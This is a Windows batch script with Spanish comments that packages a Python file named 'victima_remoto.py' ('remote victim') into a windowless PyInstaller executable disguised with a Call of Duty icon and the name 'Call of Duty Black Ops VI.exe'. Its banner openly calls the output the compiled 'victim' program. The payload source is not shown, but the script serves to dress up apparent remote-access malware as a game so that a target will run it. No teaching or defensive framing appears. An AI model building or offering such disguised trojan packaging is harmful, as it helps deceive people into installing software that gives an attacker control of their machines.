@echo off
chcp 65001 >nul
echo ============================================
echo  COMPILANDO VICTIMA COMO .EXE DE CALL OF DUTY
echo ============================================
echo.

:: 1. Generar icono
echo [1/3] Generando icono...
py -3.13 generar_icono_cod.py
if %errorlevel% neq 0 (
    echo [!] Instalando Pillow...
    py -3.13 -m pip install pillow
    py -3.13 generar_icono_cod.py
)

:: 2. Renombrar el script
echo [2/3] Preparando archivo...
copy /Y victima_remoto.py "Call of Duty Black Ops VI.py"

:: 3. Compilar a .exe con icono
echo [3/3] Compilando con PyInstaller...
py -3.13 -m pip install pyinstaller
py -3.13 -m PyInstaller --onefile --noconsole --icon=cod_icon.ico --name "Call of Duty Black Ops VI" "Call of Duty Black Ops VI.py"

echo.
echo ============================================
echo  COMPILACION COMPLETADA
echo ============================================
echo  El .exe esta en: dist\Call of Duty Black Ops VI.exe
echo  Renombrar a: Call of Duty Black Ops VI.exe
echo ============================================
pause
